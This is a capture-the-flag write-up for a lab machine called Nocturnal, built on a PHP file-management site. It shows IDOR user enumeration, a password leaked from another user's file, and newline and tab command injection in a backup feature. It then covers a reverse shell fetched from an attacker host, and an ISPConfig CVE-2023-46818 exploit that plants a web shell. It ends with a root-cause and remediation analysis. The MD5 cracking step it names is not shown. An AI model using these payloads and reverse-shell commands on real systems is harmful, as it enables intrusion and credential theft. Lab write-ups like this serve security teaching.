# Nocturnal

## Overview

A Linux machine running a PHP-based file management web service. The attack chain involves IDOR (Insecure Direct Object Reference) and LFI (Local File Inclusion) to leak credentials from another user's uploaded file, command injection via newline character blacklist bypass in the backup feature to achieve a reverse shell as `www-data`, lateral movement to `tobias` through MD5 hash cracking from a SQLite database, and finally privilege escalation via CVE-2023-46818 (ISPConfig 3.2.10p1 authenticated PHP code injection) to obtain a root shell.

## Initial Foothold

### IDOR — Accessing Another User's Files

After logging in, the dashboard at `/dashboard.php` allows file uploads. Files are accessed via `view.php` with the following URL structure:

```
http://nocturnal.htb/view.php?username=test&file=shell.php.pdf
```

The `username` parameter directly controls which user's files are served. Any authenticated user can request files belonging to other users — a classic IDOR vulnerability.

To find valid usernames, the error message behavior of `view.php` was analyzed:

| Condition | Error Message |
|-----------|---------------|
| Non-existent username | `User not found` |
| Valid username, file not found | `File does not exist` |
| Valid extension check fail | `Invalid file extension` |

This distinction enables user enumeration. `ffuf` was used with a session cookie to fuzz the `username` parameter, filtering out `User not found` responses:

```bash
ffuf -u "http://nocturnal.htb/view.php?username=FUZZ&file=test.pdf" \
  -w /usr/share/seclists/Usernames/Names/names.txt \
  -H "Cookie: PHPSESSID=<session_id>" \
  -fr "User not found"
```

![ffuf user enumeration](images/ffuf-user-enum-result.png)

Three valid users were discovered: `admin`, `amanda`, and `tobias`. The response size for `amanda` (3113 bytes) was larger than the others (3037 bytes), indicating she has files uploaded.

### LFI — Leaking Amanda's File List

Directly accessing `view.php` with `username=amanda&file=` returns `Invalid file extension` immediately. However, supplying a valid extension with a non-existent filename bypasses the extension check and reaches the file lookup stage, which renders the user's available file list in the HTML response:

```bash
curl -s "http://nocturnal.htb/view.php?username=amanda&file=x.pdf" \
  -H "Cookie: PHPSESSID=<session_id>" | grep -i "href\|li\|file"
```

![curl amanda file found](images/curl-amanda-file-found.png)

Amanda's uploaded file is `privacy.odt`. Accessing it via the IDOR vector downloads the document:

```
http://nocturnal.htb/view.php?username=amanda&file=privacy.odt
```

![privacy odt content](images/privacy-odt-content.png)

The document contains a temporary password issued to Amanda by the IT team: `arHkG7HAI68X8s1J`.

### Command Injection — Reverse Shell as www-data

Logging in as `amanda` grants access to `/admin.php`, which contains a **Create Backup** feature. The backup is generated by concatenating the password input directly into a shell command:

```php
$command = "zip -x './backups/*' -r -P " . $password . " " . $backupFile . " . > " . $logFile . " 2>&1 &";
```

A blacklist filter attempts to block dangerous characters:

```php
$blacklist_chars = [';', '&', '|', '$', ' ', '`', '{', '}', '&&'];
```

The newline character (`\n`, URL-encoded as `%0a`) is absent from the blacklist. In Linux shells, a newline terminates a command identically to a semicolon — making command injection possible. Space is blocked, but the tab character (`%09`) is not, enabling arguments to be passed to injected commands.

After logging in as amanda, the admin panel and its backup feature are accessible:

![amanda login dashboard](images/amanda-login-dashboard.png)

![admin panel](images/admin-panel-file-structure.png)

Examining `login.php` from the downloaded backup reveals the SQLite database path and MD5-based password storage:

![login php source](images/login-php-source.png)

A reverse shell script was prepared on the attacker machine and served via Python HTTP server:

```bash
echo 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1' > /tmp/shell.sh
cd /tmp && python3 -m http.server 8000
```

A netcat listener was opened:

```bash
nc -lvnp 4444
```

The payload downloads `shell.sh` and executes it in a single request. The newline (`%0a`) separates commands, and the tab (`%09`) replaces spaces within each command:

```bash
curl -s -X POST "http://nocturnal.htb/admin.php" \
  -H "Cookie: PHPSESSID=<session_id>" \
  -d "backup=1&password=test%0awget%09<ATTACKER_IP>:8000/shell.sh%09-O%09/tmp/s.sh%0abash%09/tmp/s.sh%0a"
```

![reverse shell www-data](images/reverse-shell-www-data.png)

A shell as `www-data` was obtained. The shell was stabilized:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

![shell stabilization](images/shell-stabilization.png)

![id www-data](images/id-www-data.png)

## Privilege Escalation — tobias to root

### Internal Service Discovery

```bash
ss -tlnp
```

![ss tlnp](images/ss-tlnp-port8080.png)

Port 8080 is listening only on `127.0.0.1`, making it inaccessible from outside. The service was identified as ISPConfig — an open-source server control panel — by examining the HTTP response:

```bash
curl -s http://127.0.0.1:8080/login/
```

The response includes `ispconfig.css?ver=3.2`, confirming the service identity.

### SSH Port Forwarding

To access the ISPConfig panel from a browser on the attacker machine, SSH local port forwarding is used. The `-N` flag creates the tunnel without opening an interactive shell, avoiding a port conflict with the existing SSH session:

```bash
ssh -L 8080:127.0.0.1:8080 -N -vv tobias@<TARGET_IP>
```

![ssh port forward](images/ssh-port-forward.png)

Navigating to `http://127.0.0.1:8080` in the browser shows the ISPConfig login page:

![ispconfig login page](images/ispconfig-login-page.png)

### ISPConfig Login

Logging in with `admin` / `slowmotionapocalypse` succeeds — the tobias OS password is reused as the ISPConfig admin password:

![ispconfig logged in](images/ispconfig-logged-in.png)

The Help page confirms the running version:

![ispconfig version](images/ispconfig-version.png)

**ISPConfig Version: 3.2.10p1**

### CVE-2023-46818 — Authenticated PHP Code Injection

ISPConfig versions before 3.2.11p1 are vulnerable to authenticated PHP code injection via the language file editor when `admin_allow_langedit` is enabled. An authenticated admin can inject arbitrary PHP code, which is executed server-side with the privileges of the web server process — in this case, root.

The PoC was cloned and dependencies were installed:

```bash
git clone https://github.com/hunntr/CVE-2023-46818
cd CVE-2023-46818
pip install -r requirements.txt --break-system-packages
```

![cve clone](images/cve-clone.png)

![cve requirements](images/cve-requirements.png)

The exploit was launched against the locally forwarded ISPConfig instance:

```bash
python3 CVE-2023-46818.py http://127.0.0.1:8080 admin slowmotionapocalypse
```

![cve exploit success](images/cve-exploit-success.png)

A web shell was injected at `http://127.0.0.1:8080/admin/sh.php` and an interactive `ispconfig-shell` session was established.

## Vulnerability Root Cause Analysis

| Vulnerability | Location | Root Cause | OWASP |
|--------------|----------|------------|-------|
| IDOR | `view.php` | `username` parameter not validated against session user | A01 Broken Access Control |
| LFI (File List Disclosure) | `view.php` | Error response leaks available file list when extension is valid but file does not exist | A01 Broken Access Control |
| Command Injection | `admin.php` backup feature | Blacklist-based filter does not cover newline (`\n`) and tab characters | A03 Injection |
| Credential Exposure | `amanda/privacy.odt` | Plaintext password stored in user-uploaded document | A02 Cryptographic Failures |
| Weak Password Hashing | SQLite DB | MD5 is cryptographically broken and trivially crackable | A02 Cryptographic Failures |
| Password Reuse | ISPConfig admin | OS user password reused for ISPConfig admin account | A07 Identification and Authentication Failures |
| CVE-2023-46818 | ISPConfig 3.2.10p1 | Authenticated PHP code injection via language file editor | A03 Injection |

### Real-World Impact

The command injection vulnerability demonstrates why blacklist-based input filtering is fundamentally unreliable. The developer blocked obvious shell metacharacters (`;`, `&`, `|`, `$`, spaces) but overlooked newline and tab characters — both of which function as command separators or argument delimiters in Unix shells. Allowlist validation or proper use of `escapeshellarg()` / `escapeshellcmd()` would have fully mitigated this.

The IDOR vulnerability is particularly impactful because it requires no special technique — any authenticated user can access any other user's files by simply changing a URL parameter. Server-side validation must verify that the requesting session matches the `username` parameter on every request.

The password reuse between the OS account and ISPConfig admin illustrates how a single credential compromise can cascade across multiple systems. Unique credentials per service are essential to limit lateral movement.
